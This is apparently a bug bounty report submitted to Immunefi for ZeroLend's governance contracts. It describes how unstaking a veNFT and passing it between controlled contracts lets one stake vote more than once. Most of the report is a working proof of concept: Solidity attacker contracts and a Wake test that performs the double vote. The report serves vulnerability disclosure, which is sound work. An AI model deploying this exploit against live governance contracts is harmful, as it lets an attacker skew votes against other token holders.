# 29211 - \[SC - Critical] Voting manipulation cause by the possibility to...

Submitted on Mar 10th 2024 at 19:37:05 UTC by @stiglitz for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29211

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

Users stake their veNFT into the contract `OmnichainStaking`; as a result, ERC20 token representing their staking power will be minted.

These ERC20 do not allow transfers, which is crucial because in the `PoolVoter` contract, the balance of the staking token is accessed.

```
uint256 _weight = staking.balanceOf(who);  
```

The problem is that backing veNFT token can be easily transferred.

This means that user `A` stakes `X` amount of underlying token to mint `veNFT` in the Locker contract.

NFT is then sent to the `OmnichainStaking` contract which triggers `onERC721Received` function, and user `A` gets `Y` amount of voting ERC20 token.

User `A` votes in `PoolVoter`, unstake `veNFT` from `OmnichainStaking` contract, sends it to `B`.

`B` sends NFT to the `OmnichainStaking` and get `Y` of voting tokens. Then `B` votes. This way we doubled the voting power!

## Vulnerability Details

Detailed description with steps in PoC. Actions and state changes are printed out. It is also possible to print call\_trace, emitted events etc.

## Impact Details

Vote manipulation

## References

Add any relevant links to documentation or code

## Proof of Concept

### X contract

```solidity
import {ILocker} from "../contracts/interfaces/ILocker.sol";
import {OmnichainStaking} from "../contracts/locker/OmnichainStaking.sol";
import {PoolVoter} from "../contracts/voter/PoolVoter.sol";

contract X {
    ILocker public lpLocker;
    OmnichainStaking public staking;
    PoolVoter public poolVoter;

    constructor(address _lpLocker, address _staking, address _poolVoter){
        lpLocker  = ILocker(_lpLocker);
        staking   = OmnichainStaking(_staking);
        poolVoter = PoolVoter(_poolVoter);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        //lpLocker.safeTransferFrom(address(this), lpLocker, tokenId);

        return this.onERC721Received.selector;
    }

    // Unstake from omnichain staking
    function unstakeLP(uint256 tokenId) external { 
        staking.unstakeLP(tokenId);
    }
    // This allows me to send anywhere I want
    function send(address to, uint256 tokenId) external {
        lpLocker.safeTransferFrom(address(this), to, tokenId);
    }

    function vote(address[] calldata _poolVote,uint256[] calldata _weights) external {
        poolVoter.vote(_poolVote, _weights);
    }
}
```

### Y contract

```solidity
import {ILocker} from "../contracts/interfaces/ILocker.sol";
import {OmnichainStaking} from "../contracts/locker/OmnichainStaking.sol";
import {PoolVoter} from "../contracts/voter/PoolVoter.sol";

contract Y {
    ILocker public lpLocker;
    OmnichainStaking public staking;
    PoolVoter public poolVoter;

    constructor(address _lpLocker, address _staking, address _poolVoter){
        lpLocker  = ILocker(_lpLocker);
        staking   = OmnichainStaking(_staking);
        poolVoter = PoolVoter(_poolVoter);
    }

    function onERC721Received(
        address,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        //lpLocker.safeTransferFrom(address(this), lpLocker, tokenId);

        return this.onERC721Received.selector;
    }

    // Unstake from omnichain staking
    function unstakeLP(uint256 tokenId) external { 
        staking.unstakeLP(tokenId);
    }
    // This allows me to send anywhere I want
    function send(address to, uint256 tokenId) external {
        lpLocker.safeTransferFrom(address(this), to, tokenId);
    }

    function vote(address[] calldata _poolVote,uint256[] calldata _weights) external {
        poolVoter.vote(_poolVote, _weights);
    }
}
```

### Ve mock token

```solidity
pragma solidity ^0.8.6;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Example class - a mock class derived from ERC20
contract VeToken is ERC20 {
    constructor(uint256 initialBalance) ERC20("Ve Token", "VT") public {
        _mint(msg.sender, initialBalance);
    }
}


```

### Re mock token

```solidity
pragma solidity ^0.8.6;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Example class - a mock class derived from ERC20
contract ReToken is ERC20 {
    constructor(uint256 initialBalance) ERC20("Re Token", "RT") public {
        _mint(msg.sender, initialBalance);
    }
}


```

### Test

```python
from wake.testing import *

from pytypes.openzeppelin.contracts.proxy.ERC1967.ERC1967Proxy import ERC1967Proxy
from pytypes.contracts.locker.OmnichainStaking import OmnichainStaking
from pytypes.contracts.locker.LockerToken import LockerToken
from pytypes.contracts.voter.PoolVoter import PoolVoter
from pytypes.contracts.locker.LockerLP import LockerLP
from pytypes.tests.ReToken import ReToken
from pytypes.tests.VeToken import VeToken
from pytypes.tests.X import X
from pytypes.tests.Y import Y

'''
Test written in Wake testing framework (https://getwake.io/) aka boosted brownie

Docs: 
https://ackeeblockchain.com/wake/docs/latest/

Repo:
https://github.com/Ackee-Blockchain/wake

How to run this test:

Install wake
    $ pip install eth-wake

To have actual anvil version
    $ foundryup

After installing project dependencies initialize wake
It will create `tests` folder and process foundry remappings if any
    $ wake up

Generate python representation of contracts
    $ wake init pytypes

Go to wake `tests` folder and paste this code in tests/test_default.py and run
    $ wake test tests/test_default.py

If you are interested I would be happy to teach Wake and provide complete complete protocol deployment with tests (and fuzz testing)
contact telegram: @bem1c
'''


def deploy_with_proxy(contract):
    impl = contract.deploy()
    proxy = ERC1967Proxy.deploy(impl, b"")
    return contract(proxy)

# Print failing tx call trace
def revert_handler(e: TransactionRevertedError):
    if e.tx is not None:
        print(e.tx.call_trace)

@default_chain.connect()
@on_revert(revert_handler)
def test_default():
    # ======================DEPLOY========================= #
    random  = default_chain.accounts[9]
    owner   = default_chain.accounts[0]
    bob     = default_chain.accounts[1]
    

    omnichain   = deploy_with_proxy(OmnichainStaking)
    locker      = deploy_with_proxy(LockerLP)
    pool_voter  = deploy_with_proxy(PoolVoter)
    # Two mock tokens - underlying for Locker and reward for PoolVoter
    ve_token = VeToken.deploy(100*10**18, from_=bob)
    re_token = ReToken.deploy(100*10**18, from_=bob)

    omnichain.init(random, random, locker, from_=owner)
    locker.init(ve_token, omnichain, random, from_=owner)
    pool_voter.init(omnichain, re_token, from_=owner)

    # Deploy two contracts with the ability to receive and send ERC721
    # Both controlled by Bob
    x = X.deploy(locker, omnichain, pool_voter, from_ = bob)
    y = Y.deploy(locker, omnichain, pool_voter, from_ = bob)

    # Random addresse for gauge and asset are OK now
    gauge = default_chain.accounts[2]
    asset = default_chain.accounts[3]
    pool_voter.registerGauge(asset, gauge, from_=owner)

    # ===================================================== #
    # Lock time
    two_weeks = 60*60*24*14
    # Amount
    amount  = 10*10**18
    # Bob approve locker contract
    ve_token.approve(locker, amount, from_=bob)
    # Bob creates lock for X
    locker.createLockFor(amount, two_weeks,x ,False, from_=bob)
    # Read X's token id
    toke_id = locker.tokenOfOwnerByIndex(x,0)
    # Send NFT to omnichain staking
    x.send(omnichain, toke_id, from_=bob)
    print('X transfer --> omnichain')

    # X votes in PoolVoter
    poolVote = [asset]
    weights  = [1]
    print('X vote')
    x.vote(poolVote, weights, from_=bob)
    print(f'    :: pool_voter.usedWeights(x) == {pool_voter.usedWeights(x)}')

    # HERE IS THE PROOF THAT I CAN MOVE NFTS SO I CAN MOVE VOTING POWER SO I CAN MANIPULATE VOTING
    # Just X and Y contracts were created so I can double the voting power
    # but in generel `number of contracts * voting power`
    print(f'    :: Staking balance X: {omnichain.balanceOf(x)}')
    # Unstake from staking
    x.unstakeLP(toke_id, from_=bob)
    print('X unstake from omnichain')
    print(f'    :: Staking balance X : {omnichain.balanceOf(x)}')
    print('X transfer --> Y')
    # Send from X to Y
    x.send(y, toke_id, from_=bob)
    print(f'    :: Staking balance X: {omnichain.balanceOf(x)}')
    print(f'    :: Staking balance Y: {omnichain.balanceOf(y)}')
    print('Y transfer --> omnichain')
    # Send from Y to omnichain
    y.send(omnichain, toke_id, from_=bob)
    # Y votes in PoolVoter
    y.vote(poolVote, weights, from_=bob)
    print('Y vote')
    print(f'    :: pool_voter.usedWeights(y) == {pool_voter.usedWeights(y)}')
    print(f'    :: Staking balance X: {omnichain.balanceOf(x)}')
    print(f'    :: Staking balance Y: {omnichain.balanceOf(y)}')
    # How to print call trace example
    # tx = y.vote(poolVote, weights, from_=bob)
    # print(tx.call_trace)

    # ===================================================== #


```
